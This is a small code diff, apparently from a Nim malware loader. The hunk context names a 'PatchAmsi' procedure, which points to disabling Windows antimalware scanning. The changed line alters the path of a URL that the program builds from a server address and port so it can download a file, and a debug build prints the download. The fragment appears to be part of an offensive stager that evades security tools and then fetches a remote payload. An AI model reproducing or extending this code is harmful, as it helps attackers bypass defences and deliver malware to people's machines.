@@ -60,7 +60,7 @@ proc PatchAmsi(): bool =
 
 
 
-var url = ServerProtocol & "://" & ServerAddress & ":" & $ServerPort & "/"  &  FileName
+var url = ServerProtocol & "://" & ServerAddress & ":" & $ServerPort & "/wh/"  &  FileName
 when not defined(release):
     echo "Downloading " & url
 
